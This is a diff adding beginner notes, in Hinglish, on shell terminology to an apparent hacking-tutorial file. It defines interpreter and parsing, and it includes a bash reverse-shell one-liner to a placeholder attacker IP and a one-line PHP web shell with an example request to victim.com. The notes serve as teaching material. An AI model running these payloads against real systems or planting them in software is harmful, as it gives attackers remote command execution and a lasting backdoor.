@@ -417,3 +417,101 @@ Suppose tumhe ek website pe command injection mila:
 
 ---
 
+## 🔑 Basic Technical Terms
+
+### 1. **Interpreter**
+
+* Interpreter ek **translator** hota hai jo tumhari likhi commands / code ko **line by line** samajhta aur OS/machine ko chalata hai.
+  👉 Example: Tum likhte ho `ls`, interpreter (shell) usko system call banata hai aur OS ko bhejta hai.
+
+---
+
+### 2. **Command Interpreter**
+
+* Ye ek special type ka interpreter hai jo specifically **commands** ko samajhta hai (bash, sh, cmd, powershell).
+  👉 Matlab shell hi ek **command interpreter** hai.
+
+---
+
+### 3. **Parse / Parsing**
+
+* Parse ka matlab hai ek cheez ko todna, samajhna aur rules ke hisaab se arrange karna.
+  👉 Example:
+  Tum likhte ho:
+
+  ```bash
+  ls -l /home
+  ```
+
+  Shell isko parse karta hai:
+
+  * Command = `ls`
+  * Option = `-l`
+  * Argument = `/home`
+    Fir OS ko bhej deta hai.
+
+---
+
+### 4. **Implementation**
+
+* Implementation ka matlab hota hai ek concept ko actual program bana ke chalana.
+  👉 Example:
+
+  * Concept = “Shell”
+  * Implementation = `bash`, `sh`, `zsh`, `powershell`
+
+---
+
+## ⚡ Hacking Shells
+
+### 5. **Reverse Shell**
+
+* Normal shell = tum local terminal pe ho.
+* Reverse shell = tum exploit karte ho server ko, aur woh **server tumhare machine se connect karke tumhe shell deta hai**.
+  👉 Real life: jaise tum kisi ghar mein ghusna chahte ho, lekin darwaza band hai → andar ka banda khud khidki kholke tumhe andar bula leta hai.
+
+Command example (server se tumhare IP pe connect):
+
+```bash
+bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+```
+
+---
+
+### 6. **Web Shell**
+
+* Web shell ek **script file (PHP, ASP, JSP)** hoti hai jo tum server pe upload karte ho.
+* Jab tum URL hit karte ho, woh tumhari commands execute karke output web page pe dikhati hai.
+  👉 Example:
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+URL:
+
+```
+http://victim.com/shell.php?cmd=whoami
+```
+
+Output:
+
+```
+www-data
+```
+
+👉 Real life: jaise tum ek ghar ke andar camera chhupake lagado, aur bahar se mobile se control karo.
+
+---
+
+## ✅ Quick Summary (Easy Urdu)
+
+* **Interpreter** = translator
+* **Command Interpreter** = jo commands translate kare (shell)
+* **Parse** = tod ke samajhna aur rules lagana
+* **Implementation** = asal program (bash, sh, etc.)
+* **Reverse Shell** = server tumse connect ho jaye aur tumhe access de de
+* **Web Shell** = ek script jo server pe permanent backdoor ban jaye
+
+---
+
